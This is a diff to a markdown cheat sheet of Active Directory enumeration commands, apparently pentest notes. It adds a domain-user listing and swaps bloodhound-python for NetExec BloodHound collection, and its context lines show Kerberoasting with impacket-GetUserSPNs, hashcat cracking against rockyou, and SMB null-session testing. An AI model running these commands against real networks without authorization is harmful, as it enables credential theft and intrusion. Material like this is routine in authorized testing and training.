@@ -1,5 +1,10 @@
 # Active Directory Enumeration
 
+## List Domain Users
+```
+net user /domain
+```
+
 ## Test SMB anonymous access with NetExec
 ```bash
 # -u '' for null session OR -u 'guest' for guest account
@@ -129,10 +134,10 @@ impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
 hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Collect BloodHound data with bloodhound-python
+## Collect BloodHound data with Netexec
 ```bash
-# Add -ns $IP if DNS resolution issues
-bloodhound-python -d domain.local -u username -p password -gc $IP -c all
+# $IP must be a domain controller
+nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All
 ```
 
 ## Run SharpHound on Windows target
